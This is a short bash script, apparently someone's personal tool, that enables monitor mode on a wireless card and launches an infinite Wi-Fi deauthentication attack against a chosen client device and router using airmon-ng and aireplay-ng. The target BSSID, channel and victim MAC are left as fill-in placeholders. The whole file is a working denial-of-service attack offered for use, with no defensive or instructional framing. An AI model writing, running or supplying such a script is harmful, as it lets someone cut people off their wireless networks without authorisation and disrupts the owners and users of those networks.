#!/bin/bash

echo ".........................Welcome to Hassaan ki Script....................."

if [[ $EUID -ne 0 ]]; then
   echo "[-] This script must be run as root"
   exit 1
fi

WIFI_INTERFACE="wlan0"  
TARGET_BSSID="Targeted router Mac" 
TARGET_CHANNEL="Targeted router's channel"  
VICTIM_MAC="Targeted device's MAC address" 

cleanup() {
    echo "[+] Cleaning up and restoring settings..."
    airmon-ng stop "$MONITOR_INTERFACE" &>/dev/null
    service NetworkManager restart &>/dev/null
    echo "[+] Done. Monitor mode stopped. Network services restored."
    exit
}
trap cleanup SIGINT SIGTERM

echo "[+] Enabling monitor mode on $WIFI_INTERFACE..."
airmon-ng check kill
airmon-ng start $WIFI_INTERFACE
MONITOR_INTERFACE="${WIFI_INTERFACE}mon"

echo "[+] Locking $MONITOR_INTERFACE to channel $TARGET_CHANNEL..."
iwconfig $MONITOR_INTERFACE channel $TARGET_CHANNEL

echo "[+] Starting infinite deauthentication attack on $VICTIM_MAC via $TARGET_BSSID..."
echo "[*] Press Ctrl+C to stop."

aireplay-ng --deauth 0 -a $TARGET_BSSID -c $VICTIM_MAC $MONITOR_INTERFACE

cleanup
